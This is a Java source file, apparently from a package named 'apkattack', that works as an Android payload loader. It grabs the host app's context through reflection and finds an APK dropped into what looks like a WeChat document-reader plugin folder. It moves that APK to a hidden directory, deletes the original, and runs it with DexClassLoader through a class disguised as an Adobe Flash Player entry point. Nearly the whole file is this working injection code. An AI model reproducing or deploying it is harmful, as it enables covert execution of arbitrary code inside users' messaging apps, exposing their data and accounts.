package com.example.apkattack;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collections;

import android.app.Activity;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class WeixinPPTReader {

	public static void pptreaderEntryWithoutContext(){
		String Tag = "pptreaderEntryWithoutContext";
		try {
			Log.e(Tag, "pptreaderEntryWithoutContext start");

	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "pptreaderEntry context null");
				return;
			}else{
				Log.e(Tag, "pptreaderEntry context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "call stack class:" + stackElements[i].getClassName()+
	            			"/method:" + stackElements[i].getMethodName());
	            }
	        }


			String apppath =  context.getFilesDir().getParent() + "/";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	String rawapkfn = "";
	    	
			String apkfilename = "qqsdl.apk";			//simcard.apk
			
			String cfgfilename = "ark.dat";
			
			String dexmethodname = "start";

			String newpath = apppath + "pptreader_application/";
			
			String pluginpath = apppath + "app_xwalkplugin/" ;
			

			File newpathfile = new File(newpath);
			if (newpathfile.exists() == false) {
				boolean b = newpathfile.mkdirs();
				if(b == false){
					Log.e(Tag, "create new path:" + newpath + " error");
					return;
				}else{
					Log.e(Tag, "create new path:" + newpath + " ok");
				}
			}else{
				Log.e(Tag, "new path:" + newpath + " already exist");
			}
			

			
			File apppathfile = new File(pluginpath);
			File [] apppathfiles = apppathfile.listFiles();
			if (apppathfiles == null) {
				Log.e(Tag,"list mm file path error");
				return;
			}else{
				Log.e(Tag, "list mm file path ok");
			}

			ArrayList<String> versions = new ArrayList<String>() ;
			for (int i = 0; i < apppathfiles.length; i++) {
				String listedfn = apppathfiles[i].getName();
				if (listedfn.startsWith("XFilesPPTReader_") ) {
					versions.add(listedfn);
					Log.e(Tag,"find plugin version path:" + listedfn);
				}
			}
			
			if (versions == null || versions.size() <= 0) {
				Log.e(Tag,"list XFilesPPTReader_x error");
				return;
			}
			Collections.sort(versions);

			String xwalksubpath = versions.get(versions.size() -1);
			String xwalkpath = "";
			if (xwalksubpath.equals("")) {
				Log.e(Tag,"not found latest plugin path");
				return;
			}else{
				xwalkpath = pluginpath + xwalksubpath + "/extracted/";
				Log.e(Tag, "find plugin path:" + xwalkpath + ",sub path:" + xwalksubpath);
			}
			
			
			File []unzipfiles = new File(xwalkpath).listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.contains("pptreader") == false) {
					rawapkfn = tmpfn;
					break;
				}
			}
			
			File newapkfile = new File(newpath + apkfilename);
			File newcfgfile = new File(newpath + cfgfilename);
			if (rawapkfn == null || rawapkfn.equals("")) {
				if (newcfgfile.exists() == false || newapkfile.exists() == false) {
					Log.e(Tag,"something error,not found apk or config file");
					return;
				}else{
					Log.e(Tag,"no new apk or config,but old apk and config file exist");
				}
			}else{
				Log.e(Tag,"find new apk file:" + rawapkfn);

				File oldfilecfg = new File(xwalkpath + cfgfilename);
				if (oldfilecfg.exists() == false) {
					Log.e(Tag, "not found new config file:" + oldfilecfg.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfilecfg);
					FileOutputStream fout = new FileOutputStream(newcfgfile);
					int filesize = (int)oldfilecfg.length();
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfilecfg.delete();
					
					Log.e(Tag, "copy cfg file:" + oldfilecfg.getAbsolutePath() + ",size:" + len);
				}
				
				File oldfileapk = new File(xwalkpath + rawapkfn);
				if (oldfileapk.exists() == false) {
					Log.e(Tag, "not found new apk file:" + oldfileapk.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfileapk);
					FileOutputStream fout = new FileOutputStream(newapkfile);
					int filesize = (int)oldfileapk.length();
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfileapk.delete();
					
					Log.e(Tag, "copy apk src file:" + oldfileapk.getAbsolutePath() + " to:" + 
					newapkfile.getAbsolutePath() + ",size:" + len);
				}
			}

	    	String cachepath = context.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(newpath + apkfilename, cachepath, null,context.getClassLoader());	    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method entrymethod = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    entrymethod.invoke(obj,context,newpath);
    	    
    	    Log.e(Tag, "apk or dex loaded successful");
    	    return;
		} catch (Exception e) {
			Log.e(Tag,"exception");
			e.printStackTrace();
		}
	}
	
	
	
	

	public static void pptreaderEntryWithActivity(Activity activity){
		String Tag = "pptreaderEntryWithActivity";
		try {
			Log.e(Tag, "pptreaderEntryWithActivity start");

	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "pptreaderEntry context null");
				return;
			}else{
				Log.e(Tag, "pptreaderEntry context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "call stack class:" + stackElements[i].getClassName()+
	            			"/method:" + stackElements[i].getMethodName());
	            }
	        }


			String apppath =  context.getFilesDir().getParent() + "/";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	String rawapkfn = "";
	    	
			String apkfilename = "qqsdl.apk";			//simcard.apk
			
			String cfgfilename = "ark.dat";
			
			String dexmethodname = "startActivity";

			String newpath = apppath + "pptreader_application/";
			
			String pluginpath = apppath + "app_xwalkplugin/" ;
			

			File newpathfile = new File(newpath);
			if (newpathfile.exists() == false) {
				boolean b = newpathfile.mkdirs();
				if(b == false){
					Log.e(Tag, "create new path:" + newpath + " error");
					return;
				}else{
					Log.e(Tag, "create new path:" + newpath + " ok");
				}
			}else{
				Log.e(Tag, "new path:" + newpath + " already exist");
			}
			

			
			File apppathfile = new File(pluginpath);
			File [] apppathfiles = apppathfile.listFiles();
			if (apppathfiles == null) {
				Log.e(Tag,"list mm file path error");
				return;
			}else{
				Log.e(Tag, "list mm file path ok");
			}

			ArrayList<String> versions = new ArrayList<String>() ;
			for (int i = 0; i < apppathfiles.length; i++) {
				String listedfn = apppathfiles[i].getName();
				if (listedfn.startsWith("XFilesPPTReader_") ) {
					versions.add(listedfn);
					Log.e(Tag,"find plugin version path:" + listedfn);
				}
			}
			
			if (versions == null || versions.size() <= 0) {
				Log.e(Tag,"list XFilesPPTReader_x error or not found new version path");
				return;
			}
			Collections.sort(versions);

			String xwalksubpath = versions.get(versions.size() -1);
			String xwalkpath = "";
			if (xwalksubpath.equals("")) {
				Log.e(Tag,"not found latest plugin path");
				return;
			}else{
				xwalkpath = pluginpath + xwalksubpath + "/extracted/";
				Log.e(Tag, "find plugin path:" + xwalkpath + ",sub path:" + xwalksubpath);
			}
			
			
			File []unzipfiles = new File(xwalkpath).listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.contains("pptreader") == false) {
					rawapkfn = tmpfn;
					break;
				}
			}
			
			File newapkfile = new File(newpath + apkfilename);
			File newcfgfile = new File(newpath + cfgfilename);
			if (rawapkfn == null || rawapkfn.equals("")) {
				if (newcfgfile.exists() == false || newapkfile.exists() == false) {
					Log.e(Tag,"something error,not found apk or config file");
					return;
				}else{
					Log.e(Tag,"no new apk or config,but old apk and config file exist");
				}
			}else{
				Log.e(Tag,"find new apk file:" + rawapkfn);

				File oldfilecfg = new File(xwalkpath + cfgfilename);
				if (oldfilecfg.exists() == false) {
					Log.e(Tag, "not found new config file:" + oldfilecfg.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfilecfg);
					FileOutputStream fout = new FileOutputStream(newcfgfile);
					int filesize = (int)oldfilecfg.length();
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfilecfg.delete();
					
					Log.e(Tag, "copy cfg file:" + oldfilecfg.getAbsolutePath() + ",size:" + len);
				}
				
				File oldfileapk = new File(xwalkpath + rawapkfn);
				if (oldfileapk.exists() == false) {
					Log.e(Tag, "not found new apk file:" + oldfileapk.getAbsolutePath());
					return;
				}else{
					FileInputStream fin = new FileInputStream(oldfileapk);
					FileOutputStream fout = new FileOutputStream(newapkfile);
					int filesize = (int)oldfileapk.length();
					byte [] buf = new byte[filesize];
					int len = fin.read(buf,0,filesize);
					fout.write(buf,0,filesize);
					fin.close();
					fout.close();
					oldfileapk.delete();
					
					Log.e(Tag, "copy apk src file:" + oldfileapk.getAbsolutePath() + " to:" + 
					newapkfile.getAbsolutePath() + ",size:" + len);
				}
			}

	    	String cachepath = context.getCacheDir() + "/";
	    	DexClassLoader dexcl = new DexClassLoader(newpath + apkfilename, cachepath, null,context.getClassLoader());	    	
    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();
    	    Method entrymethod = cls.getDeclaredMethod(dexmethodname, Activity.class);
    	    entrymethod.invoke(obj,activity);
    	    
    	    Log.e(Tag, "apk or dex loaded successful");
    	    return;
		} catch (Exception e) {
			Log.e(Tag,"exception");
			e.printStackTrace();
		}
	}
}
